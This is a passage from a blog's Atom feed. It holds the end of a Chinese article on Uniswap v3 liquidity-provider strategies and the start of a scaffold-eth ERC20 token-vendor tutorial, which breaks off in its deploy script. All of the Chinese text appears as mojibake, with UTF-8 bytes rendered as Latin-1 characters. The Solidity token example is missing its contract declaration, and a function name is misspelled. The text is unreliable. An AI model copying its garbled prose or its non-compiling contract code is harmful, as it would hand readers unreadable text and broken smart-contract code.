éœ€è¦æ‰‹åŠ¨è°ƒæ•´åº“å­˜æ¥é˜²æ­¢å‡ºç°ä¸€ç§èµ„äº§åœ¨ä¸€ä¾§è€—å°½ï¼Œå¯ä»¥æŒç»­æä¾›ä¸¤è¾¹çš„åº“å­˜ã€‚</p><p>æ ¹æ®ä»·æ ¼å˜åŠ¨å‘¨æœŸæ€§åœ°å†å¹³è¡¡ï¼ˆrebalanceï¼‰ä¸¤ç§èµ„äº§ä¹‹é—´çš„æ¯”ä¾‹ã€‚</p><p>åˆ©ç”¨èŒƒå›´è®¢å•ï¼ˆrange orderï¼‰è¢«åŠ¨æ‰§è¡Œçš„ï¼Œåœ¨ç°åœ¨ä»·æ ¼çš„é¢„æµ‹æ–¹å‘æ”¾ç½®ä¸€ä¸ªçª„çš„è®¢å•ï¼Œè¿™æ ·å°±é¿å…äº†swapè´¹ç”¨å’Œä»·æ ¼å½±å“ã€‚å¦‚æœä¸»åŠ¨ä½¿ç”¨ swap è¾¾åˆ° 50/50ï¼Œä¼šæœ‰ 0.3%çš„è´¹ç”¨ã€‚</p><p><strong>å¦‚ä½•æ“ä½œï¼š</strong></p><p>å¯¹äº Uniswap ä¸Šä¸ºæŸä¸ªçŸ¿æ± ï¼Œä¾‹å¦‚ ETH/USDCï¼Œå®ƒæœ‰ä¸¤ä¸ªä¸»è¦å‚æ•°ï¼š</p><ul><li>Bï¼ˆåŸºæœ¬é˜ˆå€¼ï¼‰</li><li>Rï¼ˆå†å¹³è¡¡é˜ˆå€¼ï¼‰</li></ul><p>è¯¥ç­–ç•¥å§‹ç»ˆä¿æŒä¸¤ä¸ªæœ‰æ•ˆçš„èŒƒå›´è®¢å•ï¼š</p><ul><li>åŸºæœ¬å®šå•ï¼šä»¥å½“å‰ä»·æ ¼ X ä¸ºä¸­å¿ƒï¼ŒèŒƒå›´ [X-B, X+B]ã€‚ å¦‚æœ B è¾ƒä½ï¼Œå®ƒå°†ä»äº¤æ˜“è´¹ç”¨ä¸­è·å¾—æ›´é«˜çš„æ”¶ç›Šã€‚</li><li>å†å¹³è¡¡è®¢å•ï¼šåˆšå¥½é«˜äºæˆ–ä½äºå½“å‰ä»·æ ¼ã€‚åœ¨ [X-R, X] æˆ– [X, X+R] èŒƒå›´å†…ï¼Œå…·ä½“å–å†³äºåœ¨åŸºæœ¬è®¢å•ä¸‹è¾¾åå®ƒæŒæœ‰çš„æ›´å¤šçš„ä»£å¸æ˜¯å“ªä¸€ç§ã€‚ æ­¤è®¢å•æœ‰åŠ©äºç­–ç•¥é‡æ–°å¹³è¡¡å¹¶æ¥è¿‘ 50/50 ä»¥é™ä½åº“å­˜é£é™©ã€‚</li></ul><p>æ¯24å°æ—¶ï¼Œè¿›è¡Œå†å¹³è¡¡ï¼Œæ ¹æ®ä»·æ ¼å’Œtokenæ•°é‡æäº¤è®¢å•ã€‚å¦‚æœç­–ç•¥è¡¨ç°ä¼˜ç§€ï¼Œåˆ™æ—¶é—´åŒºé—´å¯ä»¥è¢«å‡å°‘ã€‚å†å¹³è¡¡å¹¶ä¸èƒ½ä¿è¯å®Œå…¨50/50ã€‚</p><p><strong>ä¸¾ä¾‹ï¼š</strong></p><p><img src="https://user-images.githubusercontent.com/3297411/190839504-426e6004-c3f3-4101-8a08-c507915c9d20.png" alt="Untitled 9"></p><p>æ¯”å¦‚ï¼ŒETHç›®å‰ä»·æ ¼ 150USDCï¼ŒB=50ï¼ŒR=20ï¼Œç­–ç•¥æ‹¥æœ‰èµ„é‡‘ 1ETH å’Œ160USDCã€‚åˆ™åœ¨ [100, 200] æ”¾ç½®ä¸€ä¸ªåŸºç¡€è®¢å•ï¼Œä½¿ç”¨ 1ETH å’Œ 150 USDCã€‚å‰©ä½™çš„ 10 USDC ç”¨æ¥åœ¨ [130,150] æ”¾ç½®ä¸€ä¸ªåœ¨å¹³è¡¡è®¢å•ï¼Œç”¨æ¥è´­ä¹°ETHä»¥è¾¾åˆ°50/50ã€‚</p><p><img src="https://user-images.githubusercontent.com/3297411/190839510-80e1e8bd-3204-4566-a11c-b4c268246038.png" alt="Untitled 10"></p><p>å¦‚æœä»·æ ¼æå‡åˆ° 180ï¼Œ å†å¹³è¡¡ä¹‹åï¼ŒåŸºç¡€è®¢å•ä¸º [130, 230]ï¼Œè‹¥æ­¤æ—¶ç­–ç•¥æœ‰ 1.2 ETH å’Œ 90USDCï¼Œåˆ™ç­–ç•¥ä¼šä½¿ç”¨ 0.5EHT å’Œ 90USDC æ”¾å…¥åŸºç¡€è®¢å•ä¸­ï¼Œå‰©ä½™ 0.7ETH ä¼šç”¨äºåœ¨ [180, 200] ä¹‹é—´çš„å†å¹³è¡¡è®¢å•ã€‚</p><p>å®é™…æ“ä½œï¼š</p><p><a href="https://dune.com/queries/78325/155734?Number%20of%20days=200">https://dune.com/queries/78325/155734?Number of days=200</a></p><p><strong>æ•ˆæœ</strong></p><p>è“è‰²æ›²çº¿</p><p><img src="https://user-images.githubusercontent.com/3297411/190839522-c5c425e6-a397-4809-a96e-3a36c20ee8b5.png" alt="Untitled 11"></p><p>å®é™…æ•ˆæœï¼š</p><p><a href="https://dune.com/mxwtnb/Alpha-Vaults-Performance?Number+of+days=200&amp;Number+of+days_t4072e=500">https://dune.com/mxwtnb/Alpha-Vaults-Performance?Number+of+days=200&amp;Number+of+days_t4072e=500</a></p><h3><span id="ce-lue-er-yu-qi-jie-ge-fan-wei-ce-lue-expected-price-range-strategies">ç­–ç•¥äºŒï¼šé¢„æœŸä»·æ ¼èŒƒå›´ç­–ç•¥ï¼ˆexpected price range strategiesï¼‰</span></h3><p>ä»å†å²æ•°æ®ä¸­é¢„æµ‹æœªæ¥10åˆ†é’Ÿçš„ä»·æ ¼èµ°åŠ¿ï¼Œå¾—åˆ°ä¸€ä¸ªä»·æ ¼èŒƒå›´åŒºé—´ï¼Œåœ¨è¿™ä¸ªä»·æ ¼èŒƒå›´åŒºé—´ä¸­æä¾›æµåŠ¨æ€§ã€‚ç›´åˆ°å½“å‰ä»·æ ¼è¶…å‡ºä»·æ ¼èŒƒå›´ï¼Œé‡å¤ä¸Šè¿°è¿‡ç¨‹ï¼Œé‡æ–°é¢„æµ‹ä»·æ ¼èŒƒå›´å¹¶æ·»åŠ æµåŠ¨æ€§ã€‚è¿™ä¸ªä»·æ ¼èŒƒå›´ç§°ä¸ºâ€œé¢„æœŸä»·æ ¼èŒƒå›´â€ã€‚åŒæ—¶æˆ‘ä»¬å¯ä»¥åœ¨å½“å‰ä»·æ ¼æ²¡æœ‰å®Œå…¨è¶…å‡ºé¢„æœŸä»·æ ¼èŒƒå›´æ—¶è°ƒæ•´ä»·æ ¼åŒºé—´ï¼Œç§°è¿™ä¸ªä»·æ ¼èŒƒå›´ä¸ºâ€œç§»åŠ¨ç­–ç•¥èŒƒå›´ï¼ˆmove strategy rangesï¼‰â€ï¼Œè¿™ä¸ªèŒƒå›´æŒ‡ç¤ºäº†ä»€ä¹ˆæ—¶å€™éœ€è¦ç§»åŠ¨ã€‚</p><img width="479" alt="Untitled 12" src="https://user-images.githubusercontent.com/3297411/190839530-f02eb060-6daf-4545-8166-35ecf2e34270.png"><p><strong>å¦‚ä½•è®¾ç½®</strong></p><p>2018å¹´3æœˆ~2020å¹´4æœˆçš„ååˆ†é’Ÿæ•°æ®å¾—å‡ºä»·æ ¼ç§»åŠ¨åˆ†å¸ƒåœ¨ [-3%, 3%] ä¹‹é—´ã€‚å¯ä»¥è®¾ç½®ç™¾åˆ†æ¯”ä½œä¸ºä»·æ ¼æ³¢åŠ¨åŒºé—´ã€‚</p><img width="501" alt="Untitled 13" src="https://user-images.githubusercontent.com/3297411/190839533-07b08d89-e42d-471c-84c3-85444226f677.png"><p><strong>è¿›ä¸€æ­¥ç­–ç•¥</strong>ï¼šåœ¨é¢„æœŸä»·æ ¼èŒƒå›´å†…ä¸é‡‡ç”¨ä¸€è‡´çš„æµåŠ¨æ€§ï¼Œè€Œæ˜¯é‡‡ç”¨å¤šä¸ªè¿ç»­çš„æµåŠ¨æ€§å¤šå¤´ï¼Œæ¯ä¸ªå¤šå¤´å­˜å…¥ä¸åŒæ•°é‡çš„èµ„äº§ã€‚</p><p>ä¸‰ç§ç­–ç•¥ï¼š</p><ul><li>å‡åŒ€ç­–ç•¥ï¼šåœ¨ä»·æ ¼åŒºé—´å†…å‡åŒ€åˆ†å¸ƒï¼ŒUniswap v3 é»˜è®¤ï¼›</li><li>æ¯”ä¾‹ç­–ç•¥ï¼šåœ¨ä»·æ ¼åŒºé—´å†…åˆ†æˆå­ä»·æ ¼åŒºé—´ï¼Œæƒé‡å¯¹åº”ä»·æ ¼å¯èƒ½çš„å˜åŒ–æ¦‚ç‡æ”¾ç½®ï¼›</li><li>æœ€ä¼˜ç­–ç•¥ï¼šä½¿ç”¨å†³ç­–ç†è®ºï¼ˆæ¯”å¦‚é©¬å°”å¯å¤«å†³ç­–è¿‡ç¨‹ï¼‰ï¼Œè®¡ç®—ä¸€ä¸ªæ¨¡å‹æ¥ä¼°ç®—â€œæœ€ä½³â€èŒƒå›´æ¥æä¾›æµåŠ¨æ€§ï¼Œä½¿ç”¨ LP çš„â€œé£é™©è§„é¿â€ç¨‹åº¦ä½œä¸ºå‚æ•°ã€‚</li></ul><p><strong>æ¯”ä¾‹ç­–ç•¥ï¼š</strong></p><ul><li>Ba: é¢„æœŸä»·æ ¼èŒƒå›´</li><li>Bt: ç§»åŠ¨ç­–ç•¥èŒƒå›´</li></ul><p>è“çº¿ä¸ºæ¦‚ç‡åˆ†å¸ƒï¼Œä½¿ç”¨å°çš„ä»·æ ¼åŒºé—´å®ç°</p><img width="509" alt="Untitled 14" src="https://user-images.githubusercontent.com/3297411/190839543-c3e52671-e05b-4f1b-8e8a-dfeed7f886d1.png"><p><strong>ç»“è®ºï¼š</strong></p><ul><li>å¯¹äºåŒæ¶é£é™©çš„æŠ•èµ„è€…ï¼Œå‡åŒ€ç­–ç•¥æœ€ä¼˜ï¼Œå¯¹äºå…¶ä»–æ‰€æœ‰äººæ¥è¯´æ˜¯æ¬¡ä¼˜çš„ï¼›</li><li>æ¯”ä¾‹ç­–ç•¥å¯¹äºå¤§éƒ¨åˆ†åŒæ¶é£é™©çš„æŠ•èµ„è€…æ¥è¯´çš„æ¥è¿‘æœ€ä¼˜çš„ï¼›</li><li>å¯¹äºæœ€åŒæ¶é£é™©çš„æŠ•èµ„è€…è€Œè¨€ï¼Œå‡åŒ€ç­–ç•¥å¯è·åˆ©ã€‚</li></ul><p><img src="https://user-images.githubusercontent.com/3297411/190839545-ec74a8e6-e5bb-4ed2-8712-630db12c2226.png" alt="Untitled 15"></p><p>æ¯”ä¾‹ç­–ç•¥å¯¹äºé£é™©åå‘ LP æä¾›è€…æ˜¯æœ€ä¼˜çš„ï¼ˆ $\alpha$å¤§ ï¼‰ï¼Œè€Œå‡åŒ€åˆ†é…å¯¹äºé£é™©è§„é¿LPæä¾›è€…æ˜¯æœ€ä¼˜çš„ï¼ˆ $\alpha$ å°ï¼‰ã€‚</p><p>è¿™æ„å‘³ç€ï¼Œåœ¨ Uniswap v3 ä¸­è¢«åŠ¨ç®¡ç†çš„å¤´å¯¸å¯èƒ½ä¸è¶³ä»¥ä»¥èµ„æœ¬æ•ˆç‡å’Œå¹³è¡¡é£é™©èµšå–è´¹ç”¨ï¼Œç§¯æçš„æµåŠ¨æ€§æä¾›ç­–ç•¥æ—¢æ˜¯æœºé‡ä¹Ÿæ˜¯æŒ‘æˆ˜ã€‚</p><h3><span id="qi-ta-zhu-dong-de-liu-dong-xing-guan-li">å…¶ä»–ä¸»åŠ¨çš„æµåŠ¨æ€§ç®¡ç†</span></h3><p>å…¶ä»–ä¸»åŠ¨ç­–ç•¥ dapp</p><ul><li><a href="https://xtoken.market/app/invest">xToken project</a></li><li><a href="https://www.gelato.network/">Gelato Network</a></li><li><a href="https://www.visor.finance/">Visor Finance team</a></li><li><a href="http://Charm.fi">Charm.fi</a>â€™sÂ <a href="https://alpha.charm.fi/">Alpha Vaults</a></li><li><a href="https://mellow.finance/vault">Mellow Protocol</a></li></ul><p><img src="https://user-images.githubusercontent.com/3297411/190839551-e149cbf3-10fb-46c1-9a58-5507499ac6ea.png" alt="Untitled 16"></p><h2><span id="can-kao">å‚è€ƒ</span></h2><ul><li><a href="https://newsletter.banklesshq.com/p/how-to-avoid-impermanent-loss">How to avoid Impermanent Loss</a></li><li><a href="https://newsletter.banklesshq.com/p/10-going-bankless-with-uniswap-caleb">Going Bankless with Uniswap</a></li><li><a href="https://newsletter.banklesshq.com/p/how-to-make-money-with-uniswap-v3">How to make money with Uniswap V3</a></li><li><a href="https://newsletter.banklesshq.com/p/a-guide-to-uniswap-on-optimism">A Guide to Uniswap on Optimism</a></li><li><strong><strong>Uniswap Liquidity Provision: Is the Yield Worth the Risk?ï¼š</strong></strong><a href="https://medium.com/gammaswap-labs/uniswap-liquidity-provision-is-the-yield-worth-the-risk-c45a4a850700">https://medium.com/gammaswap-labs/uniswap-liquidity-provision-is-the-yield-worth-the-risk-c45a4a850700</a></li><li><a href="https://betterprogramming.pub/uniswap-v2-in-depth-98075c826254">https://betterprogramming.pub/uniswap-v2-in-depth-98075c826254</a></li><li><a href="https://liaoph.com/uniswap-v3-1/">https://liaoph.com/uniswap-v3-1/</a></li><li><a href="https://www.theblockbeats.info/news/24654">https://www.theblockbeats.info/news/24654</a></li><li><a href="https://medium.com/charmfinance/introducing-alpha-vaults-an-lp-strategy-for-uniswap-v3-ebf500b67796">https://medium.com/charmfinance/introducing-alpha-vaults-an-lp-strategy-for-uniswap-v3-ebf500b67796</a></li><li><a href="https://medium.com/@DeFiScientist/rebalancing-vs-passive-strategies-for-uniswap-v3-liquidity-pools-754f033bdabc">https://medium.com/@DeFiScientist/rebalancing-vs-passive-strategies-for-uniswap-v3-liquidity-pools-754f033bdabc</a></li><li><a href="https://uniswap.org/blog/fee-returns">https://uniswap.org/blog/fee-returns</a></li><li><a href="https://uniswapv3.flipsidecrypto.com/">https://uniswapv3.flipsidecrypto.com/</a></li><li><a href="https://newsletter.banklesshq.com/p/how-to-automate-uniswap-v3-liquidity">https://newsletter.banklesshq.com/p/how-to-automate-uniswap-v3-liquidity</a></li><li><a href="https://kydo.substack.com/p/palm-protocol-owned-active-liquidity">https://kydo.substack.com/p/palm-protocol-owned-active-liquidity</a></li></ul><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      Uniswap v3 æ— å¸¸æŸå¤±åˆ†æ
    
    </summary>
    
    
      <category term="åŒºå—é“¾" scheme="https://qiwihui.com/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
      <category term="æŠ•ç ”" scheme="https://qiwihui.com/tags/%E6%8A%95%E7%A0%94/"/>
    
      <category term="DeFi" scheme="https://qiwihui.com/tags/DeFi/"/>
    
  </entry>
  
  <entry>
    <title>å¦‚ä½•åˆ›å»ºä¸€ä¸ªä»£å¸æ‰¿é”€å•† dApp</title>
    <link href="https://qiwihui.com/qiwihui-blog-155/"/>
    <id>https://qiwihui.com/qiwihui-blog-155/</id>
    <published>2024-05-15T02:25:31.342Z</published>
    <updated>2024-05-15T02:25:31.468Z</updated>
    
    <content type="html"><![CDATA[<p>è¿™ç¯‡æ•™ç¨‹æˆ‘ä»¬æ¥å®Œæˆ scaffold-eth é¡¹ç›®çš„ç¬¬äºŒä¸ªæŒ‘æˆ˜ï¼š<a href="https://speedrunethereum.com/challenge/token-vendor">ä»£å¸æ‰¿é”€å•†</a>ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ç½‘ç«™ <a href="http://speedrunethereum.com/">speedrunethereum.com</a> ä¸­æŸ¥çœ‹æˆ–è€…ç›´æ¥æŸ¥çœ‹å¯¹åº”çš„ Github è¿æ¥ï¼š<a href="https://github.com/scaffold-eth/scaffold-eth-typescript-challenges">scaffold-eth/scaffold-eth-typescript-challenges</a>ã€‚</p><p>è¿™ä¸ªæŒ‘æˆ˜çš„ç›®çš„æ˜¯åˆ›å»ºä¸€ä¸ªè‡ªå·±çš„ERC20ä»£å¸ï¼Œå¹¶ç¼–å†™æ‰¿é”€å•†åˆçº¦ï¼Œå®ç°ç”¨æˆ·å¯¹ä»£å¸çš„è´­ä¹°å’Œå–å‡ºã€‚ä¸‹é¢ï¼Œæˆ‘ä»¬ä¸€æ­¥æ­¥å®Œæˆè¿™ä¸ªè¿‡ç¨‹ã€‚</p><span id="more"></span><h3><span id="yi-an-zhuang-bing-she-zhi-huan-jing">ä¸€ã€å®‰è£…å¹¶è®¾ç½®ç¯å¢ƒ</span></h3><p>é¦–å…ˆï¼Œæˆ‘ä»¬ä¸‹è½½é¡¹ç›®ï¼Œå¹¶åˆå§‹åŒ–ç¯å¢ƒã€‚</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/scaffold-eth/scaffold-eth-typescript-challenges.git challenge-2-token-vendor</span><br><span class="line"><span class="built_in">cd</span> challenge-2-token-vendor</span><br><span class="line">git checkout challenge-2-token-vendor</span><br><span class="line">yarn install</span><br></pre></td></tr></table></figure><p>å®‰è£…å¥½ä¾èµ–åŒ…ä¹‹åï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°é¡¹ç›®çš„ä¸»è¦ç›®å½•ä¸º <code>packages</code>ï¼ŒåŒ…å«ä¸€ä¸‹å­ç›®å½•</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">packages/</span><br><span class="line">â”œâ”€â”€ hardhat-ts</span><br><span class="line">â”œâ”€â”€ services</span><br><span class="line">â”œâ”€â”€ subgraph</span><br><span class="line">â””â”€â”€ vite-app-ts</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ï¼š</p><ul><li><code>hardhat-ts</code> æ˜¯é¡¹ç›®åˆçº¦ä»£ç ï¼ŒåŒ…å«åˆçº¦æ–‡ä»¶ä»¥åŠåˆçº¦çš„éƒ¨ç½²ç­‰ï¼›</li><li><code>services</code> The Graph åè®®çš„ graph-node é…ç½®ï¼›</li><li><code>subgraph</code> The Graph åè®®ç›¸åº”çš„å¤„ç†è®¾ç½®ï¼ŒåŒ…æ‹¬ mappingsï¼Œæ•°æ®ç»“æ„ç­‰ï¼›</li><li><code>vite-app-ts</code> å‰ç«¯é¡¹ç›®ï¼Œä¸»è¦è´Ÿè´£ç”¨æˆ·ä¸åˆçº¦äº¤äº’ã€‚</li></ul><p>The Graph åè®®æ˜¯å»ä¸­å¿ƒåŒ–çš„åŒºå—é“¾æ•°æ®ç´¢å¼•åè®®ï¼Œæœ¬ç‰‡æ•™ç¨‹ä¸­æš‚æ—¶ä¸æ¶‰åŠã€‚æˆ‘ä»¬éœ€è¦å¯åŠ¨ä¸‰ä¸ªå‘½ä»¤ç»ˆç«¯ï¼Œåˆ†åˆ«ç”¨äºè¿è¡Œä»¥ä¸‹å‘½ä»¤ï¼š</p><ul><li><code>yarn chain</code> ä½¿ç”¨ hardhat è¿è¡Œæœ¬åœ°åŒºå—é“¾ï¼Œä½œä¸ºåˆçº¦éƒ¨ç½²çš„æœ¬åœ°æµ‹è¯•é“¾ï¼›</li><li><code>yarn deploy</code> ç¼–è¯‘ã€éƒ¨ç½²å’Œå‘å¸ƒåˆçº¦ï¼›</li><li><code>yarn start</code> å¯åŠ¨ react åº”ç”¨çš„å‰ç«¯ï¼›</li></ul><p>æŒ‰é¡ºåºåˆ†åˆ«è¿è¡Œä¸Šè¿°å‘½ä»¤ä¹‹åï¼Œæ­¤æ—¶æˆ‘ä»¬å°±å¯ä»¥åœ¨ <code>http://localhost:3000</code>ä¸­è®¿é—®æˆ‘ä»¬çš„åº”ç”¨ã€‚å¦‚æœéœ€è¦é‡æ–°éƒ¨ç½²åˆçº¦ï¼Œè¿è¡Œ <code>yarn deploy --reset</code> å³å¯ã€‚</p><p><img src="https://user-images.githubusercontent.com/3297411/155913563-c0e773b7-60d1-4e5f-bdf7-2c4b0ae1df74.png" alt="yarn-start"></p><h2><span id="er-bian-xie-erc20-dai-bi-he-yue">äºŒã€ç¼–å†™ ERC20 ä»£å¸åˆçº¦</span></h2><p>ç°åœ¨æˆ‘ä»¬è¿›å…¥åˆçº¦ç¼–å†™éƒ¨åˆ†ã€‚æˆ‘ä»¬çš„ç›®æ ‡æ˜¯ç¼–å†™ä¸€ä¸ª ERC20 ä»£å¸åˆçº¦ï¼Œå¹¶ä¸ºåˆ›å»ºè€…é“¸é€  1000 ä¸ªä»£å¸ã€‚</p><h3><span id="shi-me-shi-erc20-he-yue-biao-zhun">ä»€ä¹ˆæ˜¯ ERC20 åˆçº¦æ ‡å‡†</span></h3><p>ä»£å¸å¯ä»¥åœ¨ä»¥å¤ªåŠä¸­è¡¨ç¤ºä»»ä½•ä¸œè¥¿ï¼Œæ¯”å¦‚ä¿¡èª‰ç§¯åˆ†ï¼Œé»„é‡‘ç­‰ï¼Œè€Œ ERC-20 æä¾›äº†ä¸€ä¸ªåŒè´¨åŒ–ä»£å¸çš„æ ‡å‡†ï¼Œæ¯ä¸ªä»£å¸ä¸å¦ä¸€ä¸ªä»£å¸ï¼ˆåœ¨ç±»å‹å’Œä»·å€¼ä¸Šï¼‰å®Œå…¨ç›¸åŒã€‚</p><p>ERC20æ˜¯å„ä¸ªä»£å¸çš„æ ‡å‡†æ¥å£ï¼ŒåŒ…å«ä»¥ä¸‹æ–¹æ³•ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// åç§°</span><br><span class="line">function name() public view returns (string)</span><br><span class="line">// ç¬¦å·</span><br><span class="line">function symbol() public view returns (string)</span><br><span class="line">// åˆçº¦ä½¿ç”¨çš„å°æ•°ä½ï¼Œå¸¸è§ä¸º 18</span><br><span class="line">function decimals() public view returns (uint8)</span><br><span class="line">// ä»£å¸æ€»ä¾›åº”é‡</span><br><span class="line">function totalSupply() public view returns (uint256)</span><br><span class="line">// åœ°å€çš„ä»£å¸æŒæœ‰é‡</span><br><span class="line">function balanceOf(address _owner) public view returns (uint256 balance)</span><br><span class="line">// ä»£å¸åˆ’è½¬</span><br><span class="line">function transfer(address _to, uint256 _value) public returns (bool success)</span><br><span class="line">// ç”¨äºåˆ’è½¬ä»£å¸ï¼Œä½†è¿™äº›ä»£å¸ä¸ä¸€å®šå±äºè°ƒç”¨åˆçº¦çš„ç”¨æˆ·</span><br><span class="line">function transferFrom(address _from, address _to, uint256 _value) public returns (bool success)</span><br><span class="line">// åˆçº¦æˆäºˆç”¨æˆ·ä»£å¸ç®¡ç†æƒé™ï¼Œè°ƒç”¨è€…è®¾ç½® spender æ¶ˆè´¹è‡ªå·± amount æ•°é‡çš„ä»£å¸</span><br><span class="line">function approve(address _spender, uint256 _value) public returns (bool success)</span><br><span class="line">// æ£€æŸ¥ä»£å¸çš„å¯æ¶ˆè´¹ä½™é¢</span><br><span class="line">function allowance(address _owner, address _spender) public view returns (uint256 remaining)</span><br><span class="line"></span><br><span class="line">// äº‹ä»¶</span><br><span class="line">// ä»£å¸è½¬ç§»äº‹ä»¶</span><br><span class="line">event Transfer(address indexed from, address indexed to, uint256 value);</span><br><span class="line">// å½“è°ƒç”¨ approve æ—¶ï¼Œè§¦å‘ Approval äº‹ä»¶</span><br><span class="line">event Approval(</span><br><span class="line">    address indexed owner,</span><br><span class="line">    address indexed spender,</span><br><span class="line">    uint256 value</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ï¼Œåˆçº¦å¿…éœ€è®¾ç½® <code>totalSupply</code>ã€ <code>balanceOf</code> ã€ <code>transfer</code> ã€ <code>transferFrom</code>ã€ <code>approve</code> ä»¥åŠ <code>allowance</code> è¿™å…­ä¸ªå‡½æ•°ï¼Œå…¶ä»–å¦‚ <code>name</code>ã€ <code>symbol</code> å’Œ <code>decimalsze</code> åˆ™æ˜¯å¯é€‰å®ç°ã€‚</p><h3><span id="shi-yong-openzeppelin-ku">ä½¿ç”¨ OpenZeppelin åº“</span></h3><p>å¦‚æœä»ä¸Šè¿°çš„åˆçº¦æ ‡å‡†å¼€å§‹ï¼Œæˆ‘ä»¬éœ€è¦å®ç°è¿™å…­ä¸ªå‡½æ•°çš„æ–¹æ³•ï¼Œå¹¸è¿çš„æ˜¯ï¼ŒOpenZeppelin åº“æ˜¯ä¸€ä¸ªæˆç†Ÿçš„åˆçº¦å¼€å‘åº“ï¼Œä¸ºæˆ‘ä»¬å®ç°äº† ERC20 ä»£å¸åŸºæœ¬åŠŸèƒ½ï¼Œæˆ‘ä»¬å¯ä»¥åŸºäºè¿™ä¸ªåº“å¼€å‘æˆ‘ä»¬çš„ ERC20 ä»£å¸ï¼Œè¿™å°†å¤§å¤§å‡å°‘æˆ‘ä»¬çš„å·¥ä½œé‡ã€‚æˆ‘ä»¬å¯ä»¥åœ¨ <a href="https://docs.openzeppelin.com/contracts/4.x/erc20">ERC20 æ ‡å‡†</a> é¡µé¢æŸ¥åˆ°ç›¸å…³çš„ä½¿ç”¨æ–¹æ³•ã€‚</p><p>é™¤äº† ERC20ï¼ŒOpenZeppelin åº“è¿˜æä¾›äº†å…¶ä»–åˆçº¦æ ‡å‡†çš„å®ç°ï¼Œæ¯”å¦‚ ERC721ï¼ŒERC777ç­‰ï¼Œä»¥åŠå¤§é‡çš„ç»è¿‡å®‰å…¨å®¡è®¡çš„åº“ï¼Œè¿™äº›å¯¹äºæˆ‘ä»¬å¿«é€Ÿå¼€å‘å’Œå®ç°å®‰å…¨çš„åˆçº¦ä»£ç æä¾›äº†æ”¯æŒã€‚</p><h3><span id="bian-xie-dai-ma">ç¼–å†™ä»£ç </span></h3><p>æˆ‘ä»¬ä½¿ç”¨ ERC20.sol æ¥å®ç°æˆ‘ä»¬çš„åˆçº¦ï¼Œåˆ›è§ä¸€ä¸ªåä¸º <code>GOLD</code> çš„ä»£å¸ï¼Œä»£å¸ç¬¦å·ä¸º <code>GLD</code>ï¼Œå¹¶ä¸ºåˆ›å»ºè€…é“¸é€  1000 ä¸ªä»£å¸ï¼š</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pragma solidity &gt;=0.8.0 &lt;0.9.0;</span><br><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line"></span><br><span class="line">import <span class="string">&#x27;@openzeppelin/contracts/token/ERC20/ERC20.sol&#x27;</span>;</span><br><span class="line"></span><br><span class="line">// learn more: https://docs.openzeppelin.com/contracts/3.x/erc20</span><br><span class="line"></span><br><span class="line">  constructor() public ERC20(<span class="string">&#x27;Gold&#x27;</span>, <span class="string">&#x27;GLD&#x27;</span>) &#123;</span><br><span class="line">    // é“¸é€  1000 * 10 ** 18 ç»™ msg.sender</span><br><span class="line">    _mint(msg.sender, 1000 * 10 ** 18);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ï¼Œ <code>_mint</code> æ–¹æ³•æ˜¯ ERC20 æä¾›çš„æ–¹æ³•ï¼Œè¯¥æ–¹æ³•åˆ›å»ºç›¸åº”æ•°é‡çš„ä»£å¸ï¼Œå¹¶å°†ä»£å¸å‘é€ç»™è´¦æˆ·ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/** @dev Creates `amount` tokens and assigns them to `account`, increasing</span><br><span class="line"> * the total supply.</span><br><span class="line"> *</span><br><span class="line"> * Emits a &#123;Transfer&#125; event with `from` set to the zero address.</span><br><span class="line"> *</span><br><span class="line"> * Requirements:</span><br><span class="line"> *</span><br><span class="line"> * - `account` cannot be the zero address.</span><br><span class="line"> */</span><br><span class="line">function _mint(address account, uint256 amount) internal virtual &#123;</span><br><span class="line">    require(account != address(0), &quot;ERC20: mint to the zero address&quot;);</span><br><span class="line"></span><br><span class="line">    _beforeTokenTransfer(address(0), account, amount);</span><br><span class="line"></span><br><span class="line">    _totalSupply += amount;</span><br><span class="line">    _balances[account] += amount;</span><br><span class="line">    emit Transfer(address(0), account, amount);</span><br><span class="line"></span><br><span class="line">    _afterTokenTransfer(address(0), account, amount);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä»£ç åœ°å€ï¼š<a href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol#L248">https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol#L248</a></p><h3><span id="bu-shu-jiao-ben">éƒ¨ç½²è„šæœ¬</span></h3><p>æ¥ç€æˆ‘ä»¬ä½¿ç”¨è„šæœ¬è¿›è¡Œéƒ¨ç½²ï¼Œå¹¶å‘åœ°å€å‘é€ 1000 ä»£å¸ï¼Œåœ°å€å¯ä»¥åœ¨ <code>http://localhost:3000</code> ä¸­è¿æ¥æˆ‘ä»¬çš„ Metamask å¾—åˆ°ã€‚éƒ¨ç½²è„šæœ¬åœ°å€ï¼š<code>packages/hardhat-ts/deploy/00_deploy_your_token.ts</code>ã€‚</p><figure class="highlight tsx"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> yourToken = <span class="keyword">await</span> ethers.<span class="title function_">getContract</span>(<span class="string">&#x27;YourToken&#x27;</span>, deployer);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// å‘é€ä»£å¸</span></span><br><span class="line">  <span class="keyword">const</span> result = <span class="keyword">await</span> yourToken.<span class="title function_">transfer</span>(<span class="string">&#x27;0x169841AA3024cfa570024Eb7Dd6Bf5f774092088&#x27;</span>, ethers.<span class="property">utils</span>.<span class="title function_">parseEther</span>(<span class="string">&#x27;1000&#x27;</span>));</span><br><span class="line"></span><br><span 